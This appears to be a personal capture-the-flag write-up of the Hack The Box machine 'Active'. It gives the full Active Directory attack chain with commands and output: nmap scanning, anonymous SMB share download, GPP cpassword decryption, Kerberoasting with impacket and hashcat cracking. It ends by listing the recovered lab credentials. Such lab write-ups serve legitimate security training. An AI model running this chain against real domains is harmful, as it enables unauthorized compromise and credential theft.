### Host entries:
```bash
10.10.10.100  active.htb
```
If Active Directory => [[Synchronize NTP]] with the domain controller.

### Content

- SMB Enumeration
- SMB Full share replication to local machine [[SMB Download]] `smbclient mget*`
- GPP Decryption
- Kerberoasting
- Hashcat TGS crack

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.10.100
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.100 ()   Status: Up
Host: 10.10.10.100 ()   Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49152/open/tcp//unknown///, 49153/open/tcp//unknown///, 49154/open/tcp//unknown///, 49155/open/tcp//unknown///, 49157/open/tcp//unknown///, 49158/open/tcp//unknown///, 49165/open/tcp//unknown///, 49166/open/tcp//unknown///, 49168/open/tcp//unknown///
```
Services and Versions running:
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49168 -sCV -Pn -n -vvv -oN targeted 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.089s latency).
Scanned at 2023-02-09 00:37:51 EST for 73s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-02-09 05:37:58Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack Microsoft Windows RPC
49166/tcp open  msrpc         syn-ack Microsoft Windows RPC
49168/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
|_clock-skew: 0s
| smb2-time: 
|   date: 2023-02-09T05:38:55
|_  start_date: 2023-02-09T05:22:50
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38577/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 51069/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
Enumerating port 445 we identify that we have Read access to the Replication share:
```bash
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB 10.10.10.100 445 DC [+] active.htb\: 
SMB 10.10.10.100 445 DC [+] Enumerated shares
SMB 10.10.10.100 445 DC Share   Permissions  Remark
SMB 10.10.10.100 445 DC -----   -----------  ------
SMB 10.10.10.100 445 DC ADMIN$ Remote Admin
SMB 10.10.10.100 445 DC C$  Default share
SMB 10.10.10.100 445 DC IPC$Remote IPC
SMB 10.10.10.100 445 DC NETLOGON  Logon server share 
SMB 10.10.10.100 445 DC Replication  READ 
SMB 10.10.10.100 445 DC SYSVOL Logon server share
SMB 10.10.10.100 445 DC Users
```
We then enumerate the share, it has a lot of information within so we rather prefer to download the whole volume locally: ^72bf14
```bash
# First connect to the machine
smbclient //10.10.10.100/Replication -N
# Then turn off the Prompt and turn on the replicate function
smb: \> RECURSE ON
smb: \> PROMPT OFF
# Finally extract all the files
smb: \> mget *
```
We then check what info is within the share:
![[Pasted image 20230209005650.png]]
### Exploitation
This structure is very similar to the SYSVOL share so we know that there is a Groups.xml, this file can have a GPP hash that can be decrypted: ^959fa1
```bash
cat ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
And we can decrypt the cpassword with gpp-decrypt utility:
```bash
# Decrypting cpassword
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

### Privilege Escalation
Now, since we know that there is no port tcp-5985 to login directly open we can keep the enumeration on port tcp-445, the next share interesting is not SYSVOL but Users and this is its structure:
![[Pasted image 20230209010606.png]]
After a deep enumeration, we couldn't identify any useful file that could provide a privesc or a lateral movement so we tried another approach which is a [[Kerberoasting (Service Account Attacks)]]. ^659f81
```bash
impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-02-09 00:24:03.458965             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$
...
d03f8fe0c361c57c9c755c7d8a1024dd38c4beaf73a3688eb2c103450979c4e729c0b6d21a44160b71cc6             
```
This means that we can extract a TGS ticket directly from the DC, and we successfully get it, so next thing to do is to crack it with [[Hashcat]]:
```bash
D:\Programas\hashcat-6.2.5>hashcat.exe -m 13100 -a 0 hash.txt rockyou.txt
hashcat (v6.2.5) starting


$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$
...
f0cc1679087568696baa79fef670721b$0bd9f0addc75c15876fda2aae6fc4a9611250979c4e729c0b6d21a44160b71cc6:Ticketmaster1968
```
### Credentials
```bash
svc_tgs:GPPstillStandingStrong2k18
Administrator:Ticketmaster1968
```

### Notes

- We can extract a share with SMB directly by abusing of the [[SMB Download]] with SMBClient `mget *` functionality.

### References
* None


